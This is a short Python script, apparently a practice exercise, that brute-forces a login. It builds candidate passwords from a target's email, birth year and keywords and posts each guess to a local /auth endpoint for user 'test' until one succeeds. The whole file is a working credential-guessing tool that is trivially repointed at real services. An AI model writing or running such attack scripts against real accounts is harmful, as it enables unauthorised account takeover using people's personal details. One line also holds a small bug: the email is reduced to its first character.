import re
import requests

email = input("User email: ")
age = input("User age like '1986': ")
user_words = [w.strip() for w in input("User key worlds split by ',': ").split(",")]

EMAIL_REGEX = re.compile(r"[^@]+@[^@]+\.[^@]+")

if len(user_words) < 1:
    raise Exception("cap alphabet should be more 1", user_words)
if len(age) != 4:
    raise Exception("age should be like 1986", age)
if not EMAIL_REGEX.match(email):
    raise Exception("email should be like test@test.test", email)

alphabet = user_words[:]

alphabet.append(email.strip('@')[0])
alphabet.append('.')
alphabet.append('_')
alphabet.append(age)
alphabet.append(age[2:])
for a in alphabet[:]:
    if a.isdecimal() and len(a) == 4:
        alphabet.append(a[2:])

base = len(alphabet)

n = 0
while True:
    temp = n
    password = ''
    while temp > 0:
        k = temp // base
        rest = temp % base
        password = alphabet[rest] + password
        temp = k
    n += 1

    print(password)
    response = requests.post('http://127.0.0.1:4000/auth',
                             json={'login': 'test', 'password': password})
    if response.status_code == 200:
        print('SUCCESS', password)
        break
